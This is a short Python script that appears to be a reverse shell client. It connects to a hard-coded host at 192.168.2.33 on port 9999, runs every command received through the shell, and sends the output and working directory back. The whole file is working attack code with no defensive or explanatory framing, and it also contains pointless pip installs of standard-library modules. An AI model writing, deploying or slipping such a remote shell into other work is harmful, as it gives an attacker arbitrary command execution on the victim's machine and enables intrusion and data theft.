import subprocess
import socket
import os

subprocess.run(["pip install socket"], shell=True)
subprocess.run(["pip install os"], shell=True)

s = socket.socket()
host = "192.168.2.33"
port = 9999
s.connect((host, port))

while True:
    cmd = s.recv(1024)
    if cmd[:2].decode("utf-8") == "cd":
        os.chdir(cmd[3:].decode("utf-8"))
    if len(cmd) > 0:
        cmd = subprocess.Popen(cmd[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + "> "))
        print(output_str)
